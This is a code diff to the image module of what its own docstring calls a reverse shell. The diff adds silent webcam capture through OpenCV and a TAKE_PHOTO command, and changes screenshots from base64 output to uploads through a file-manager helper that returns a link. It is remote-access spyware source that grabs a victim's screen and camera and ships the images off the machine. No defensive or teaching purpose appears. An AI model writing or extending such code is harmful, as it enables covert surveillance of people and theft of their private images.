@@ -3,17 +3,19 @@ This module handles all the Image related task for the reverse shell
 """
 
 # 1st party imports
-import base64
 from io import BytesIO
 from typing import List
 
 # 3rd party imports
+import cv2
 from mss import mss
 from PIL import Image
 from mss.screenshot import ScreenShot
 
-# 3rd party imports
+# local imports
 from commands import ShellCommands
+from Utilities.file_manager import FileManager
+
 
 class PhotoGrapher:
     """
@@ -24,6 +26,15 @@ class PhotoGrapher:
         """
         Initialize the PhotoGrapher class
         """
+
+        # initialize a FileManager
+        self.file_manager = FileManager()
+
+        # initialize the camera
+        try :
+            self.camera = cv2.VideoCapture(0)
+        except Exception as e:
+            self.camera = None
 
     def take_screenshot(self) -> ScreenShot:
         """
@@ -36,7 +47,7 @@ class PhotoGrapher:
         with mss() as sct:
             return sct.grab(sct.monitors[1])
 
-    def get_screenshot_base_64(self) -> str:
+    def get_screenshot_link(self) -> str:
         """
         Get the screenshot of the screen and return it as a base64 string
 
@@ -56,8 +67,44 @@ class PhotoGrapher:
         img.save(buffer, format="PNG")
         img_bytes = buffer.getvalue()
 
-        # convert it to a base64 and return
-        return base64.b64encode(img_bytes).decode("utf-8")
+        # upload and return the link
+        return self.file_manager._upload_bytes(img_bytes)
+
+    def take_camera_photo(self) -> bytes:
+        """
+        Take a photo of the camera and return it as bytes
+
+        Returns:
+            bytes: The bytes of the photo.
+        """
+
+        # capture the photo
+        if self.camera is None:
+            return "Camera not initialized"
+
+        ret, frame = self.camera.read()
+        if not ret:
+            return "Failed to capture photo"
+
+        # encode the image
+        _, encoded_image = cv2.imencode('.png', frame)
+
+        # return the bytes
+        return encoded_image.tobytes()
+
+    def get_camera_photo_link(self) -> str:
+        """
+        Take a photo of the camera, upload and return the link
+
+        Returns:
+            str: The link to the photo.
+        """
+
+        # take the photo
+        photo_bytes = self.take_camera_photo()
+
+        # upload and return the link
+        return self.file_manager._upload_bytes(photo_bytes)
 
     def handle_command(self, command: List[str]) -> str:
         """
@@ -71,7 +118,10 @@ class PhotoGrapher:
         """
 
         if command[0] == ShellCommands.TAKE_SCREENSHOT.value:
-            return self.get_screenshot_base_64()
+            return self.get_screenshot_link()
+
+        elif command[0] == ShellCommands.TAKE_PHOTO.value:
+            return self.get_camera_photo_link()
 
         else:
             return f"Invalid command for photographer. Provided command: `{" ".join(command)}`"
